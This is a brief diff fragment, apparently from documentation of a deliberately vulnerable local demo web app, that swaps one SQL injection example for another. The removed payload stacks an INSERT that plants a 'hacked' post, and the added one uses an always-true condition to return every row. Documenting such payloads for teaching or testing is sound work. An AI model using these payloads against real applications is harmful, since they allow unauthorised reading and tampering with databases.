@@ -25,5 +25,5 @@ http://localhost:3000/posts?utf8=%E2%9C%93&search=archive&status=foo=%22bar%22%3
 SQL Injection:
 
 ```
-foo%'); INSERT INTO posts (id,title,body,created_at,updated_at) VALUES (99,'hacked','hacked alright','2013-07-18','2013-07-18'); SELECT "posts".* FROM "posts" WHERE (title like 'hacked%
+foo%' OR true) --
 ```
